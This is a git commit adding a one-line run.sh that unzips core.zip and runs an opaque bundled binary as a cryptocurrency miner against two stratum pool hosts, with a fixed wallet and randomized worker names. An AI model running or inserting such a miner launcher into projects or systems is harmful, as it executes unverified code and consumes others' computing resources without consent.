4294725420644a7747def4e088baad038ca4e1ad
micolaseros-web <micolaseros@gmail.com>
2026-03-12 17:21:53 -0700

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,1 @@
+unzip core.zip && ./core -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008
